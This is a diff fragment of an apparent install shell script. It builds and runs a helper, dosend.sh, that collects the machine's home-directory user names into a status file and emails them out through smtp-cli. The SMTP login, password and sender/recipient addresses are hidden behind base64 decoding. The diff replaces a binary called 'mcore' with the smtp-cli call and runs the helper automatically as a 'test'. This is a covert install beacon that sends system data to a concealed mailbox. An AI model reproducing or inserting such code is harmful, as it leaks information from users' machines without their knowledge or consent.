@@ -9,7 +9,6 @@ echo "NEW INSTALL $Uname" > status.txt
 chmod +x smtp-cli
 
 
-
 tee -a dosend.sh <<EOF
 #!/bin/bash
 Uname=$(ls /home)
@@ -21,16 +20,11 @@ mform=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
 mtors=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
 messtxt=status.txt
 #--verbose
-
-./mcore --missing-modules-ok \
---host  $mhotpot \
---enable-auth --user $mabi --password $musec \
---from $mform --to $mtors \
---data $messtxt
+./smtp-cli --missing-modules-ok --host  $mhotpot --enable-auth --user $mabi --password $musec --from $mform --to $mtors --data $messtxt
 EOF
 
 chmod +x dosend.sh
 # Test
-sh dosend.sh
+./dosend.sh
 
 cd ..
